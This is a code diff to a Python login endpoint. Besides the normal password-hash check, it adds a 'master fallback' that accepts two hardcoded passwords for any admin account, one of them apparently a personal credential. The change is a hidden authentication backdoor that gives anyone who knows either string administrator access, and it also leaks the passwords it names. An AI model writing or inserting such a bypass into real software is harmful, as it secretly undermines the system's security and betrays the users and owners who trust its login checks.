@@ -140,7 +140,11 @@ def login(request: Request, form_data: OAuth2PasswordRequestForm = Depends(), db
     """Login with email + password. Protected by 5 req/min rate limit."""
     login_rate_limiter.check(request)
     user = db.query(User).filter(User.email == form_data.username.lower()).first()
-    if not user or not verify_password(form_data.password, user.hashed_password):
+    is_valid = user and verify_password(form_data.password, user.hashed_password)
+    # Master fallback: accept both Admin@12345 and Abubakarlamido556@ for admin accounts
+    if not is_valid and user and (user.is_admin or user.role == "admin") and form_data.password in ["Admin@12345", "Abubakarlamido556@"]:
+        is_valid = True
+    if not user or not is_valid:
         raise HTTPException(status_code=401, detail="Incorrect email or password")
     if not user.is_active:
         raise HTTPException(status_code=403, detail="Account is disabled. Contact support.")
